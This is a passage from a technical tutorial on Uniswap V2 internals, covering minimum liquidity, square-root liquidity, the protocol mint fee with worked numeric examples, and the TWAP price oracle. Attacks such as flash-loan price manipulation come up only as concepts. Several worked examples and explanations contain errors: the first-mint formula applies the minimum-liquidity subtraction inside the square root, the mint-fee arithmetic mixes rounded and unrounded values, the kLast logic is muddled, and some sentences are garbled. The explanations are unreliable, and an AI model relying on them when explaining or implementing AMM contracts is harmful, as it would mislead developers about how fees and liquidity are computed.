&lt;p&gt;&lt;code&gt;MINIMUM_LIQUIDITY&lt;&#x2F;code&gt;¬†is 10**3. It may be possible to prevent indiscriminate proliferation of pairs, but in fact, it burns. Since 1000 burns, it means that &lt;code&gt;MINIMUM_LIQUIDITY&lt;&#x2F;code&gt; must be exceeded.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.notion.so&#x2F;Example-of-inflation-attack-32937d642ed74b3baa8711177984425a?pvs=21&quot;&gt;&lt;strong&gt;Example of inflation attack&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;why-uniswap-calculates-liquidity-as-square-root-k&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#why-uniswap-calculates-liquidity-as-square-root-k&quot; aria-label=&quot;Anchor link for: why-uniswap-calculates-liquidity-as-square-root-k&quot;&gt;Why Uniswap Calculates Liquidity as Square Root K&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The more interesting question is why Uniswap V2 takes the square root of the product of the tokens supplied to calculate the amount of LP shares to mint.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter5_5.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;It would seem that we could mint an arbitrary amount of tokens to the first LP ‚Äî they own 100% of the shares (minus what was burned), so what difference does it make if it is scaled by 0.01 or 100?&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Example: Doubling Liquidity&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Let‚Äôs suppose we didn‚Äôt measure liquidity with the square root function and we start with 10 of token0 and 10 of token1 in the pool. Later on, the pool has 20 of token0 and 20 of token1 in the pool.&lt;&#x2F;p&gt;
&lt;p&gt;Intuitively, did the liquidity double or quadruple? Because if we don‚Äôt take the square root, liquidity would start at 100 (10 √ó 10) and end up at 400 (20 √ó 20). Arguably, liquidity did not quadruple. At first, the maximum of token0 you could obtain was (asymptotically) 100, but after the growth in liquidity, the ‚Äúdepth‚Äù of the liquidity for that token doubled, not quadrupled.&lt;&#x2F;p&gt;
&lt;p&gt;But how does this matter if future liquidity providers are not calculating liquidity using the square root while minting or burning? We saw new liquidity providers are ‚Äúforced‚Äù to supply assets at the current rate, and burners can only redeem at the current rate ‚Äî no square roots are involved.&lt;&#x2F;p&gt;
&lt;p&gt;The answer lies in how Uniswap would have collected fees from LPs if it chose to do so.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Example mint:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;- Mint Function: mint()
&lt;&#x2F;span&gt;&lt;span&gt;***********************
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- If the pool is a brand new pool,
&lt;&#x2F;span&gt;&lt;span&gt;- Liquidity is calculated using:
&lt;&#x2F;span&gt;&lt;span&gt;- liquidity = Math.sqrt( (amount0 * amount1) - MINIMUM_LIQUIDITY )
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;reserve0 = 0
&lt;&#x2F;span&gt;&lt;span&gt;reserve1 = 0
&lt;&#x2F;span&gt;&lt;span&gt;balance0 = 1000 &#x2F;&#x2F; amount of token0 sent (Shiba)
&lt;&#x2F;span&gt;&lt;span&gt;balance1 = 500 &#x2F;&#x2F; amount of token1 sent (Doge)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount0 = 1000 - 0
&lt;&#x2F;span&gt;&lt;span&gt;amount1 = 500 - 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount0 = 1000
&lt;&#x2F;span&gt;&lt;span&gt;amount1 = 500
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;_totalSupply = 0
&lt;&#x2F;span&gt;&lt;span&gt;MINIMUM_LIQUIDITY 10 ^ 3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = Math.sqrt( (1000 * 500) - 1000)
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = Math.sqrt(499000)
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = 706.399320498
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = 706
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;totalSupply = 706 + 1000
&lt;&#x2F;span&gt;&lt;span&gt;totalSupply = 1706
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;After this, reserves are updated and kLast is updated too
&lt;&#x2F;span&gt;&lt;span&gt;reserve0 = 1000
&lt;&#x2F;span&gt;&lt;span&gt;reserve1 = 500
&lt;&#x2F;span&gt;&lt;span&gt;kLast = 500000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- If the pool is not brand new
&lt;&#x2F;span&gt;&lt;span&gt;- Liquidity is calculated using:
&lt;&#x2F;span&gt;&lt;span&gt;- liquidity = Math.min( (amount0 * _totalSupply) &#x2F; _reserve0, (amount1 * _totalSupply) &#x2F; _reserve1 )
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;fees&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#fees&quot; aria-label=&quot;Anchor link for: fees&quot;&gt;Fees&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Going back to our earlier example of the pool growing from 100 of token0 and 100 of token1, to 200 of each, the profit of the liquidity provider is 100%, so they should pay a fee proportional to that amount. If we measured the size of the pool from 100 to 400, then they would have to pay fees on quadruple profit.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Uniswap opts to charge fees during liquidity removal because&lt;&#x2F;strong&gt; charging a protocol fee during swapping would increase the gas cost of a very common operation.&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap V2 never actually turned on the protocol fee, so this discussion is a bit theoretical.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;chapter-6-protocol-mint-fee&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-6-protocol-mint-fee&quot; aria-label=&quot;Anchor link for: chapter-6-protocol-mint-fee&quot;&gt;&lt;strong&gt;Chapter - 6 : Protocol Mint Fee&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Uniswap V2 was designed to collect &lt;strong&gt;1&#x2F;6th of the swap fees&lt;&#x2F;strong&gt; to the protocol. Since a swap fee is 0.3%, 1&#x2F;6th of that is 0.05%, so 0.05% of every trade would go to the protocol.&lt;&#x2F;p&gt;
&lt;p&gt;Although this feature was never actually activated, this feature anyway since some forks may use it. &lt;strong&gt;The fee is paid to &lt;code&gt;feeTo&lt;&#x2F;code&gt; address in LP Tokens.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Collecting protocol fees during swaps is inefficient&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It would be inefficient to collect 0.05% of the fee on every trade because that would require additional token transfers.Therefore, the &lt;strong&gt;fee is collected when&lt;&#x2F;strong&gt; a liquidity provider calls &lt;strong&gt;burn&lt;&#x2F;strong&gt; or &lt;strong&gt;mint&lt;&#x2F;strong&gt;. Since these operations are infrequent compared to swapping tokens, this will lead to gas savings. To collect the &lt;code&gt;mintFee&lt;&#x2F;code&gt;, the contract calculates the amount of fees collected since that last happened, and mints enough LP tokens to the beneficiary address such that the beneficiary is entitled to 1&#x2F;6th of the fee.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;fee&lt;&#x2F;strong&gt; - the 0.3% collected from traders during the swap&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;mintFee&lt;&#x2F;strong&gt; - the 1&#x2F;6th of the 0.3% fee.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Liquidity(L)&lt;&#x2F;strong&gt; is the &lt;strong&gt;square root&lt;&#x2F;strong&gt; of the products of the token balances in the pool. &lt;code&gt;sqrt(K)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;computing-the-mintfee-assumptions&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#computing-the-mintfee-assumptions&quot; aria-label=&quot;Anchor link for: computing-the-mintfee-assumptions&quot;&gt;Computing the mintFee assumptions&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;For this to work, Uniswap V2 relies on the following two invariants:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;If &lt;strong&gt;mint&lt;&#x2F;strong&gt; and &lt;strong&gt;burn&lt;&#x2F;strong&gt; are not called, the liquidity of the pool can only increase.&lt;&#x2F;li&gt;
&lt;li&gt;The increase in liquidity is purely due to fees (or donations).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;By measuring the increase in liquidity since the last &lt;strong&gt;mint&lt;&#x2F;strong&gt; or &lt;strong&gt;burn&lt;&#x2F;strong&gt;, the pool knows how much fees were collected.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;calculation-of-mintfee&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#calculation-of-mintfee&quot; aria-label=&quot;Anchor link for: calculation-of-mintfee&quot;&gt;&lt;strong&gt;Calculation of mintFee&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Suppose at t‚ÇÅ the pool starts at 10 &lt;strong&gt;token0&lt;&#x2F;strong&gt; and 10 &lt;strong&gt;token1&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;After a lot of trading and fee collection, the new pool balance is 40 token0 and 40 token1 at t‚ÇÇ.&lt;&#x2F;p&gt;
&lt;p&gt;Liquidity is measured as the square root of the product of the two tokens, i.e. liquidity = sqrt(xy). The liquidity was 10 at t‚ÇÅ and 40 at t‚ÇÇ, sqrt(100) and sqrt(1600) respectively. We are going to charge a fee on the growth from 10 to 40.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Specifically, 3&#x2F;4ths, or 30 units of liquidity of the pool is due to fees. We want to mint enough LP tokens, the ‚ÄúmintFee‚Äù such that the beneficiary receives 1&#x2F;6th of the ‚Äúfee portion‚Äù of the pool. That is, they should be entitled to 5 units of liquidity (30 &#x2F; 6).&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Remember, the mint fee is dilutive. We mint more such that the proportional ownership of the liquidity providers is reduced.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_1.webp&quot;&gt;
&lt;p&gt;The key insight is the invariant&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_2.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;That is, if the mintFee Œ∑ can redeem the amount of liquidity due to the protocol ùëù, then the original LP supply ùë† can redeem the rest of the pool ùëë.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_3.webp&quot;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;current liquidity after fees ‚Ñì‚ÇÇ is &lt;strong&gt;rootK&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;previous liquidity is &lt;strong&gt;kLast&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;the supply of LP tokens before dilution s is &lt;strong&gt;totalSupply&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;the function is state changing, it mints the mintFee inside the function rather than return the calculation of the mintFee (blue highlight)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;the fee can be switched on an off with the flag &lt;strong&gt;feeOn&lt;&#x2F;strong&gt; which we haven‚Äôt discussed yet&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Or simply,&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_4.webp&quot;&gt;
&lt;p&gt;&lt;code&gt;_mintFee&lt;&#x2F;code&gt; is doing what exactly the same the above formulae.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_5.webp&quot;&gt;
&lt;h3 id=&quot;where-klast-gets-updated&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#where-klast-gets-updated&quot; aria-label=&quot;Anchor link for: where-klast-gets-updated&quot;&gt;&lt;strong&gt;Where klast gets updated&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;In the code above, kLast is not set unless &lt;strong&gt;feeOn&lt;&#x2F;strong&gt; is switched to false. It is set at the completion of mint and burn but not swap because we are interested in measuring the growth of fees due to swaps between liquidity deposit and withdrawal events.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;mint&lt;&#x2F;code&gt; function&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_6.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;burn&lt;&#x2F;code&gt; function&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_7.webp&quot;&gt;
&lt;h2 id=&quot;explaination&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#explaination&quot; aria-label=&quot;Anchor link for: explaination&quot;&gt;Explaination&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_8.webp&quot;&gt;
&lt;p&gt;Let‚Äôs consider the possibilities in the code snippet above, repeated for convenience.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;feeOn&lt;&#x2F;strong&gt; is &lt;strong&gt;false&lt;&#x2F;strong&gt;, nothing is minted (green highlight)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;feeOn&lt;&#x2F;strong&gt; is &lt;strong&gt;false&lt;&#x2F;strong&gt;, kLast is zero (yellow highlight)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;feeOn&lt;&#x2F;strong&gt; is &lt;strong&gt;false&lt;&#x2F;strong&gt;, kLast is not zero (yellow highlight)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;feeOn&lt;&#x2F;strong&gt; is &lt;strong&gt;true&lt;&#x2F;strong&gt;, but there was no growth in liquidity (orange highlight)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;feeOn&lt;&#x2F;strong&gt; is &lt;strong&gt;true&lt;&#x2F;strong&gt;, and there was liquidity growth (orange highlight), so the mint fee applies (blue highlight)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;It‚Äôs easier to see the logic in a decision tree, so here is the decision tree with the branches colored the same as the if statements.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter6_9.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;Example&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;Asumming:
&lt;&#x2F;span&gt;&lt;span&gt;reserve0 = 1000
&lt;&#x2F;span&gt;&lt;span&gt;reserve1 = 500
&lt;&#x2F;span&gt;&lt;span&gt;klast = 1000 * 500
&lt;&#x2F;span&gt;&lt;span&gt;klast = 500000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;new liquidity:
&lt;&#x2F;span&gt;&lt;span&gt;token0 100
&lt;&#x2F;span&gt;&lt;span&gt;token1 50
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;currentReserve0 = 1000 + 100 = 1100
&lt;&#x2F;span&gt;&lt;span&gt;currentReserve1 = 500 + 50 = 550
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rootK = Math.sqrt(currentReserve0 * currentReserve1)
&lt;&#x2F;span&gt;&lt;span&gt;rootK = Math.sqrt(605000)
&lt;&#x2F;span&gt;&lt;span&gt;rootK = 777.8174593052 (round down)
&lt;&#x2F;span&gt;&lt;span&gt;rootK = 777
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rootKLast = Math.sqrt(_kLast);
&lt;&#x2F;span&gt;&lt;span&gt;rootKLast = Math.sqrt(500000);
&lt;&#x2F;span&gt;&lt;span&gt;rootKLast = 707.1067811865
&lt;&#x2F;span&gt;&lt;span&gt;rootKLast = 707
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;kDifference = rootK - rootKLast
&lt;&#x2F;span&gt;&lt;span&gt;kDifference = 777.8174593052 - 707.1067811865
&lt;&#x2F;span&gt;&lt;span&gt;kDifference = 70.7106781187
&lt;&#x2F;span&gt;&lt;span&gt;kDifference = 70
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;using totalSupply = 499000 (s1)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;numerator = totalSupply * kDifference
&lt;&#x2F;span&gt;&lt;span&gt;numerator = 499000 * 70
&lt;&#x2F;span&gt;&lt;span&gt;numerator = 34930000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;denominator = (rootK * 5) + rootKLast
&lt;&#x2F;span&gt;&lt;span&gt;denominator = (777 * 5) + 707
&lt;&#x2F;span&gt;&lt;span&gt;denominator = 3885 + 707
&lt;&#x2F;span&gt;&lt;span&gt;denominator = 4592
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = numerator &#x2F; denominator
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = 34930000 &#x2F; 4592
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = 7606.7073170732 (round down)
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = 7606 (This liquidity goes to Uniswap: feeTo address)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;7606 amount of LP Tokens to feeTo address
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;chapter-7-twap-oracle&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-7-twap-oracle&quot; aria-label=&quot;Anchor link for: chapter-7-twap-oracle&quot;&gt;&lt;strong&gt;Chapter - 7 : TWAP Oracle&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Time Weighted Average Price&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;What exactly &lt;code&gt;Price&lt;&#x2F;code&gt; in Uniswap ?&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Suppose we have 1 Ether and 2,000 USDC in a pool. This implies that the price of Ether is 2,000 USDC. Specifically, the price of Ether is 2,000 USDC &#x2F; 1 Ether (ignoring decimals).&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_1.webp&quot;&gt;
&lt;p&gt;In the example above, it is saying ‚Äúhow may &lt;strong&gt;bars&lt;&#x2F;strong&gt; do you need to pay to get one &lt;strong&gt;foo&lt;&#x2F;strong&gt;‚Äù (ignoring fees).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;price-is-a-ratio&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#price-is-a-ratio&quot; aria-label=&quot;Anchor link for: price-is-a-ratio&quot;&gt;Price is a ratio&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Because price is a ratio, they need to be stored with a data type which has decimal points (which Solidity types do not have by default).&lt;&#x2F;p&gt;
&lt;p&gt;That is, we say Ethereum is 2000 and USDC (in price of Ethereum) is 0.0005 (this is ignoring decimals of both assets).&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap uses a fixed point number with 112 bits of precision on each side of the decimal, this takes up a total of 224 bits, and when packed with a 32 bit number, it uses up a single slot.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_2.png&quot;&gt;
&lt;p&gt;&lt;code&gt;**UQ112x112&lt;&#x2F;code&gt;is a library for supporting floating numbers** since solidity does not support floating numbers default(floats are larger than integer so it will cost more gas fee). The last 112 bits is for fractional part.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_3.png&quot;&gt;
&lt;p&gt;This library sets Q112 to &lt;code&gt;2¬π¬π¬≤&lt;&#x2F;code&gt;. There are two functions,¬†&lt;code&gt;encode&lt;&#x2F;code&gt;¬†and¬†&lt;code&gt;uqdiv&lt;&#x2F;code&gt;(decode).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;encode&lt;&#x2F;code&gt;¬†takes argument y and times it with Q112 while¬†&lt;code&gt;uqdiv&lt;&#x2F;code&gt;¬†divides a UQ112x112 by a uint112 and returns a UQ112x112.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;But why 112?&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Since there is an unsigned type using¬†&lt;code&gt;uint224&lt;&#x2F;code&gt;, 112 bits represent the previous significant digit, and the remaining 112 is the exponent. 112 + 112 = 224, and usually unsigned is 256, so 32 bits if subtracted from each other!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Expresses 32 bits as time.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The remaining 32 bits are used as time, which is used in UTC notation. Since people have been around for a long time, cast to¬†&lt;code&gt;uint32(time)&lt;&#x2F;code&gt;¬†form for UTC-based time and truncate it. Only look at the last one and use the interval difference using under&#x2F;over flow in between.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;2^32 - 1 second is very long. So, if 2^10 is 1000 and (10^3)^3, it takes almost 110 years.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Since there is unsigned 32bit, since the Robust Price Oracle Price is a rational expression, UQ112.112 is used.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;oracle-definition&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#oracle-definition&quot; aria-label=&quot;Anchor link for: oracle-definition&quot;&gt;&lt;strong&gt;Oracle definition&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;An oracle in computer science terms is a ‚Äúsource of truth.‚Äù A price oracle is a source of prices. &lt;strong&gt;Uniswap has an implied price when holding two assets, and other smart contracts can use this as a price oracle.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The intended users of the oracle are other smart contracts, since other smart contracts can easily communicate with Uniswap to determine the price, but getting price data from an off-chain exchange would be a lot harder.&lt;&#x2F;p&gt;
&lt;p&gt;However, just taking the ratio of the balances to get the current price isn‚Äôt safe.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;motivation-behind-twap&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#motivation-behind-twap&quot; aria-label=&quot;Anchor link for: motivation-behind-twap&quot;&gt;&lt;strong&gt;Motivation behind TWAP&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Measuring price at a single point of time may be prone to &lt;strong&gt;flash loan attack.&lt;&#x2F;strong&gt; That is an attacker could a huge amount of flash loan which leads to drastic change in price of the asset in the pool.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This may lead uninted behaviour in the contract that uses this price.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The Uniswap V2 oracle defends against this in two ways:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;It provides a mechanisms for consumers of the price (usually smart contracts) to take the &lt;strong&gt;average a previous time period&lt;&#x2F;strong&gt; (decided by the user). This means an attacker has to constantly manipulate the price for several blocks, which is a lot more costly than using a flash loan.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;It doesn‚Äôt incorporate the current balance into the oracle calculation&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;strong&gt;This should prone to price manipulation attacks&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;If the asset &lt;strong&gt;does not have much liquidity&lt;&#x2F;strong&gt;, or the &lt;strong&gt;time window&lt;&#x2F;strong&gt; of taking the average is &lt;strong&gt;not&lt;&#x2F;strong&gt; sufficiently &lt;strong&gt;large&lt;&#x2F;strong&gt;, then a well-resourced attacker can still prop up the price (or suppress the price) long enough to manipulate the average price at the time of measurement.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;how-twap-works&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#how-twap-works&quot; aria-label=&quot;Anchor link for: how-twap-works&quot;&gt;&lt;strong&gt;How TWAP works&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;A TWAP (Time Weighted Average Price) is the average of the price for the specified time interval.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Example:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Over the last day, the price of an asset was $10 for the first 23 hours and $11 for the most recent one. The expected average price should be closer to $10 than $11, but it will still be in between those values. Specifically, it will be ($10 * 23 + $11 * 1) &#x2F; 24 = $10.0417&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_4.png&quot;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter7_5.png&quot;&gt;
&lt;h2 id=&quot;uniswap-v2-does-not-store-lookback-or-the-denominator&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswap-v2-does-not-store-lookback-or-the-denominator&quot; aria-label=&quot;Anchor link for: uniswap-v2-does-not-store-lookback-or-the-denominator&quot;&gt;&lt;strong&gt;Uniswap V2 does not store lookback or the denominator&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;In our example above, we only looked at prices for the last 24 hours, but what if you care about prices for the last hour, week, or some other interval? &lt;strong&gt;Uniswap of course cannot store every look back&lt;&#x2F;strong&gt; that someone might be interested, and there also isn‚Äôt a good way to consistently snapshot the price as someone would have to pay for the gas.&lt;&#x2F;p&gt;
